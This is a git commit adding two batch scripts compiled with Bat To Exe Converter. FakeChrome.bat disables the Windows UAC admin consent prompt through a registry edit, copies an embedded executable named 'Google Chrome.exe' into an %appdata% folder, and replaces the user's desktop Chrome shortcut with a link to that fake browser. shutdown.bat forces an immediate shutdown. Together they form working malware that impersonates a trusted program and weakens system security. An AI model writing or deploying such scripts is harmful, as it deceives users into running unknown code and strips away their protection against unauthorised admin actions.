4384de1697ec65be09551b81c38b971f55a7eb26
HongyiHank <wenchi610227@gmail.com>
2023-01-15 12:32:20 +0800

    1.0

---
+++ FakeChrome.bat
@@ -0,0 +1,44 @@
+::[Bat To Exe Converter]
+::
+::fBE1pAF6MU+EWHreyHcjLQlHcCyNMmyjD/U06ebw086IoVgQUewra7P81buJLOVTyU32epsomH9Cnas=
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSzk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFDNbQgObNSuSB7sX1Mz07P+Kp0MJR965jl9eGEoG8weVHLxhsUgR/ltyuYUJFB44
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+c:
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
+md "%appdata%\Duchie"
+md "%appdata%\Duchie\FackBrowser"
+copy "%b2eincfilepath%\Google Chrome.exe" "%appdata%\Duchie\FackBrowser"
+cd %userprofile%\Desktop
+del "Google Chrome.lnk"
+del "Google Chrome"
+mklink "Google Chrome" "%appdata%\Duchie\FackBrowser\Google Chrome.exe"
+del "%b2eincfilepath%\Google Chrome.exe"
---
+++ shutdown.bat
@@ -0,0 +1,34 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFDNbQgObNSuSB7sX1Mz+/OGTrV0hc+0wf4Pe5ZeGMu8e73rtdpkj6UV8nckeGRpKZy35Pl1mliBRoGPLPsST0w==
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSzk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFDNbQgObNSuSB7sX1Mz07P+Kp0MJR94Yd4Dc1rHOA+gB5UjhO5M10xo=
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+shutdown /s /t 0
